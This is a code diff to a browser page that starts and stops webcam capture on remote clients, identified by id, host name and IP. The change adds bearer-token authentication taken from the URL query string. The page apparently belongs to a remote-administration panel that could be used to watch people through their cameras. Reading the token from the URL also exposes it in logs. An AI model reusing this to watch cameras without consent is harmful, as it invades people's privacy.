@@ -4,7 +4,15 @@ const params = new URLSearchParams(location.search);
 const clientId = Number(params.get('id'));
 const hostName = params.get('host') || `client ${clientId}`;
 const hostIp   = params.get('ip') || '';
+const token    = params.get('token') || '';
+
 $('target').textContent = `${hostName} @ ${hostIp}`;
+
+function apiFetch(url, opts = {}) {
+  opts.headers = opts.headers || {};
+  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
+  return fetch(url, opts);
+}
 
 let cfg = { camera: 0, width: 640, height: 480, quality: 55, fps: 12 };
 let running = false;
@@ -47,7 +55,7 @@ async function start() {
   showSpinner('connecting to camera…');
   firstFrameSeen = false;
 
-  const r = await fetch(`/api/clients/${clientId}/webcam/start`, {
+  const r = await apiFetch(`/api/clients/${clientId}/webcam/start`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(cfg),
@@ -70,7 +78,7 @@ async function start() {
 async function stop() {
   if (!running) return;
   running = false;
-  try { await fetch(`/api/clients/${clientId}/webcam/stop`, { method: 'POST' }); } catch {}
+  try { await apiFetch(`/api/clients/${clientId}/webcam/stop`, { method: 'POST' }); } catch {}
 }
 
 async function loop() {
